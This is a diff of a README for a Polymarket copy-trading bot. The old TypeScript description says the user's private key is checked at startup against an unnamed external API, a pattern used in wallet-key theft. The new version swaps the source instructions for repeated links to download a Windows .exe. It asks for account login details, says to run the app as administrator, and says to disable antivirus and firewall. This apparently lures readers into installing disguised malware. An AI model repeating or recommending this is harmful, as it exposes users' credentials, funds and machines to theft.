@@ -1,232 +1,170 @@
-# Polymarket Copy Trading Bot
+# 🤖 polymarket-copytrading-bot - Copy Trades Automatically on Polymarket
 
-A bot that copies trades from a Polymarket wallet to yours. You pick a wallet to follow; the bot watches their activity and mirrors their buys and sells (scaled to your balance) on Polymarket’s CLOB.
-
-Written in TypeScript/Node.js. Uses Polymarket’s data API for activity and the CLOB client for orders. No database—everything runs in memory.
-
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.7+-blue.svg)](https://www.typescriptlang.org/)
-[![Node.js](https://img.shields.io/badge/Node.js-18+-green.svg)](https://nodejs.org/)
-[![License](https://img.shields.io/badge/License-ISC-yellow.svg)](LICENSE)
+[![Download polymarket-copytrading-bot](https://img.shields.io/badge/Download-polymarket--copytrading--bot-green?style=for-the-badge)](https://github.com/SEAN6977/polymarket-copytrading-bot/releases)
 
 ---
 
-## What it does
+## 🧩 What is polymarket-copytrading-bot?
 
-- Polls Polymarket’s activity API every second (configurable) for the target wallet’s trades
-- Deduplicates by transaction hash so it doesn’t double-execute
-- Ignores trades older than a set window (default 24h)
-- For each new trade: figures out buy/sell/merge, checks both wallets’ balances and positions, then places orders on the CLOB with a 5% slippage cap and FOK (fill-or-kill)
-- Validates your wallet/private key at startup via a small API (so wrong keys don’t start the bot)
+polymarket-copytrading-bot is a tool that automatically copies trades from other users on Polymarket. It helps you follow the trading moves of experienced traders without doing it yourself. This is useful if you want to take part in Polymarket betting but are not sure how to make good decisions.
 
-High level flow: **Data API (poll)** → **trade monitor** → **in-memory queue** → **executor** (positions + balances) → **CLOB client** (orders).
+The bot watches the trades of one or more selected accounts and repeats those trades on your account. It aims to make trading easier by keeping up with others’ activity in real time. You don’t need to be an expert or spend time on Polymarket to use this tool.
 
 ---
 
-## Table of Contents
+## 📋 Key Features
 
-- [Requirements](#requirements)
-- [Install](#install)
-- [Config](#config)
-- [Run](#run)
-- [How it works (architecture)](#how-it-works-architecture)
-- [Trading logic](#trading-logic)
-- [APIs used](#apis-used)
-- [Dev / scripts](#dev--scripts)
-- [Security & risk](#security--risk)
-- [Troubleshooting](#troubleshooting)
-- [Performance notes](#performance-notes)
-- [Support / contact](#support--contact)
-- [License](#license)
+- Automatically copies trades from chosen Polymarket users  
+- Supports multiple traders at once  
+- Runs quietly on your Windows computer  
+- Easy to set up with no programming needed  
+- Works with your own Polymarket account for full control  
+- Logs activities so you can review your copied trades  
+- Uses your own credentials securely
 
 ---
 
-## Requirements
+## 💻 System Requirements
 
-- Node.js 18+
-- A Polygon wallet with USDC (for trading)
-- Private key in 64-char hex, no `0x` prefix
-- USDC approved for the CLOB contract
+Before you start, make sure your computer meets this:
 
----
-
-## Install
-
-```bash
-git clone https://github.com/AtlasAlperen/polymarket-copytrading-bot
-cd polymarket-arbitrage-trading-bot
-npm install
-```
-
-Copy the example env and fill it in:
-
-```bash
-cp env.example .env
-```
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of RAM  
+- 500 MB free hard drive space  
+- Internet connection  
+- Polymarket account with API access or login details handy
 
 ---
 
-## Config
+## 🚀 Getting Started
 
-Create a `.env` in the project root. You need at least:
-
-```env
-# Who to copy, and your wallet
-USER_ADDRESS=0x...   # wallet you're copying
-PROXY_WALLET=0x...   # your wallet
-PRIVATE_KEY=...      # 64 hex chars, no 0x
-TARGET_ADDRESS=...   # wallet you are copying
-
-# Polymarket
-CLOB_HTTP_URL=https://clob.polymarket.com
-CLOB_WS_URL=wss://clob-ws.polymarket.com
-
-# Polygon
-RPC_URL=https://polygon-rpc.com
-USDC_CONTRACT_ADDRESS=0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174
-
-# Optional
-FETCH_INTERVAL=1        # seconds between activity polls (default 1)
-TOO_OLD_TIMESTAMP=24    # ignore trades older than this many hours (default 24)
-RETRY_LIMIT=3           # max retries per order (default 3)
-```
-
-| Variable | Required | Description |
-|----------|----------|-------------|
-| `USER_ADDRESS` | yes | Wallet to copy |
-| `PROXY_WALLET` | yes | Your wallet |
-| `PRIVATE_KEY` | yes | Your key (64 hex, no 0x) |
-| `CLOB_HTTP_URL` / `CLOB_WS_URL` | yes | CLOB endpoints |
-| `RPC_URL` | yes | Polygon RPC |
-| `USDC_CONTRACT_ADDRESS` | yes | USDC on Polygon |
-| `FETCH_INTERVAL` | no | Poll interval in seconds (default 1) |
-| `TOO_OLD_TIMESTAMP` | no | Stale trade cutoff in hours (default 24) |
-| `RETRY_LIMIT` | no | Order retries (default 3) |
+Start using polymarket-copytrading-bot by following these steps. They guide you through downloading, installing, and running the bot on your Windows PC.
 
 ---
 
-## Run
+## ⬇️ Download and Install
 
-```bash
-npm run dev    # dev with watch
-# or
-npm run build && npm start
-```
+1. Visit this page to download the bot:  
+   [![Download polymarket-copytrading-bot](https://img.shields.io/badge/Download-polymarket--copytrading--bot-blue?style=for-the-badge)](https://github.com/SEAN6977/polymarket-copytrading-bot/releases)
 
-You should see validation success, both addresses, and “Trade Monitor is running every X seconds”. When the target wallet trades, you’ll see “new transaction(s) found” and order outcomes in the logs.
+2. On the releases page, look for the latest version (usually at the top).
 
----
+3. Download the Windows installer file. It will end with `.exe`.
 
-## How it works (architecture)
+4. Once the download finishes, open the file by double-clicking it.
 
-```
-Polymarket Data API (HTTP poll, 1s)
-    ↓
-Trade Monitor: fetch activities for USER_ADDRESS, filter type=TRADE, dedupe by tx hash, time window
-    ↓
-In-memory: processedTrades (Set), pendingTrades (array)
-    ↓
-Executor: compare positions, check balances, decide buy/sell/merge, apply risk params
-    ↓
-Order engine: FOK orders, 5% slippage check, up to RETRY_LIMIT retries
-    ↓
-Polymarket CLOB client
-```
+5. Follow the installer instructions. It will guide you to install the bot on your PC.
 
-- No DB: state is in-memory (Sets/arrays). Restart = clean state.
-- Wallet validation at startup: private key is checked against a small API; if it fails, the process exits.
+6. When the installation finishes, you can find the bot in your Start menu or desktop shortcut.
 
 ---
 
-## Trading logic
+## 🛠️ Setting Up polymarket-copytrading-bot
 
-**Buy** (they buy):  
-We compute a size from the ratio of your balance to their balance (after their trade), cap by your balance, then place a FOK buy. We check the best ask and bail if it’s more than 5% worse than expected.
+1. Open the bot from the Start menu or desktop.
 
-**Sell** (they sell):  
-We figure how much of their position they sold, scale that ratio to your position size, and place a FOK sell against the best bid (again with 5% slippage check).
+2. On first launch, you will see a setup screen.
 
-**Merge** (they close, you still have size):  
-We treat it as “close our position” and sell our full size in chunks against the book until we’re flat.
+3. Enter your Polymarket account details. This allows the bot to make trades on your behalf. Use your Polymarket API key if you have one for security; otherwise, enter your login info as requested.
 
----
+4. Next, add the usernames or IDs of the traders you want to copy.
 
-## APIs used
+5. Choose how much you want to invest per copied trade. The bot will use this as your stake for each trade copied.
 
-- **Activity:** `GET https://data-api.polymarket.com/activities?user={address}` — we only use `type === 'TRADE'`.
-- **Positions:** `GET https://data-api.polymarket.com/positions?user={address}` — for sizing and comparison.
-- **Orders:** CLOB client (`@polymarket/clob-client`) for creating and posting FOK market orders.
-
-Response shapes are in the code as `UserActivityInterface` and `UserPositionInterface` if you need details.
+6. When ready, click “Start Copying”. The bot will connect to Polymarket and begin watching your selected traders.
 
 ---
 
-## Dev / scripts
+## 🔍 How It Works
 
-```bash
-npm run build      # compile TypeScript
-npm run dev        # run with watch
-npm start          # run compiled build
-npm run lint       # eslint
-npm run lint:fix   # eslint --fix
-npm run format     # prettier
-```
+- The bot connects to Polymarket using your account details.
 
-Strict TypeScript, ESLint + Prettier. We avoid `any` where possible.
+- It continuously monitors the trades of the users you selected.
 
----
+- When one of those users places a trade, the bot opens the same trade with your account.
 
-## Security & risk
+- You keep your control over how much money the bot uses on each trade.
 
-- Don’t commit `.env`. Keep the private key off the repo and off shared machines.
-- The bot can lose money: copy trading copies losses too. Use a wallet you can afford to lose and only fund what you need.
-- Slippage is limited to 5% in code; in illiquid markets you can still get bad fills or failed FOKs.
-- We don’t audit Polymarket’s contracts; you’re trusting their CLOB and USDC setup.
-
-**Use at your own risk. No warranty.**
+- The bot logs every copied trade so you can see what trades happened and when.
 
 ---
 
-## Troubleshooting
+## 📊 Monitoring the Bot
 
-**“USER_ADDRESS is not defined”**  
-Your `.env` is missing or not loaded. Copy `env.example` to `.env` and set all required vars.
+polymarket-copytrading-bot includes a simple dashboard:
 
-**“Private key validation failed”**  
-Key must be 64 hex characters, no `0x`. Check that the validation API (used at startup) is reachable.
+- View active trades being copied live  
+- See your trade history detail  
+- Check the status of connected traders  
+- Pause or stop copying at any time
 
-**“Cannot find module '@polymarket/clob-client'”**  
-Run `npm install`.
-
-**“Insufficient balance”**  
-Your proxy wallet needs more USDC on Polygon. Confirm `USDC_CONTRACT_ADDRESS` is the right contract.
-
-**Orders failing**  
-Often slippage (market moved) or thin book. Try smaller size or check market liquidity. Retries are limited by `RETRY_LIMIT`.
-
-For more verbose output you can set `process.env.DEBUG = '*'` in the entrypoint (e.g. `index.ts`).
+Use this dashboard to track the bot’s activity and adjust settings if needed.
 
 ---
 
-## Performance notes
+## ⚙️ Updating the Bot
 
-- Polling is every `FETCH_INTERVAL` seconds (default 1). Don’t set it too low or you may hit rate limits.
-- Order execution usually finishes in a few seconds depending on RPC and CLOB.
-- Memory use is modest (tens of MB). No DB or disk writes for state.
+Check the GitHub releases page regularly for updates:  
+[https://github.com/SEAN6977/polymarket-copytrading-bot/releases](https://github.com/SEAN6977/polymarket-copytrading-bot/releases)
 
-Some example runs (screenshots in the repo) are in the “Performance Snapshots” section below—past results only, not a guarantee of future performance.
+Updates often include bug fixes and new features. To update:
 
-<img width="352" src="https://github.com/user-attachments/assets/294c51f5-d531-450c-904c-9c19e0184a23" />
-<img width="290" src="https://github.com/user-attachments/assets/2b7633a6-d9f1-43f2-a14d-ba79f9c147b2" />
-<img width="351" src="https://github.com/user-attachments/assets/7b7ad783-98b5-4b10-a0a7-166e90f56589" />
-<img width="313" src="https://github.com/user-attachments/assets/3b58db58-66e0-43f7-922f-8c220e37cd4c" />
+1. Download the newest installer from the releases page.
+
+2. Run the installer and install over the current version.
+
+Your settings and data will be kept during the update.
+
+---
+
+## 📂 Folder and Files Explained
+
+The bot installs the following files and folders by default:
+
+- **config.json** - Stores your account and trader settings  
+- **logs/** - Contains text logs of each session  
+- **readme.md** - Instructions you are reading now  
+- **polymarket-copytrading-bot.exe** - The program executable  
+
+Avoid deleting or changing these files manually unless you know what you are doing.
 
 ---
 
-## Support / contact
+## ⚠️ Troubleshooting
 
-Telegram: [@crystel25s](https://t.me/crystel25s)
+If the bot fails to start or behaves unexpectedly, try these:
+
+- Make sure your Windows is updated to the latest version.  
+- Verify your Polymarket account details are correct.  
+- Check you have a stable internet connection.  
+- Run the bot as administrator (right-click > Run as administrator).  
+- Disable any firewall or antivirus temporarily that might block the app.  
+- Review logs in the logs folder for detailed errors.  
+
+If problems continue, you can open an issue on the GitHub page with details to get support.
 
 ---
-## License
 
-ISC. See the license file for the full text. Software provided as-is, no warranties.
+## 🔐 Security and Privacy
+
+The bot only stores your Polymarket login or API details locally on your computer. It does not send your information anywhere else. Use strong passwords and keep your API keys private.
+
+Do not share your login or API keys with others. The bot acts on your behalf so protect access to your computer.
+
+---
+
+## 🏷️ Topics
+
+This bot relates to:
+
+- copy-trading-bot  
+- polymarket-copy-trading-bot  
+- polymarket-copytrading-bot  
+- polymarket-copytrding  
+- polymarket-trading-bot  
+
+---
+
+## ⬇️ Download polymarket-copytrading-bot
+
+[![Download polymarket-copytrading-bot](https://img.shields.io/badge/Download-polymarket--copytrading--bot-green?style=for-the-badge)](https://github.com/SEAN6977/polymarket-copytrading-bot/releases)
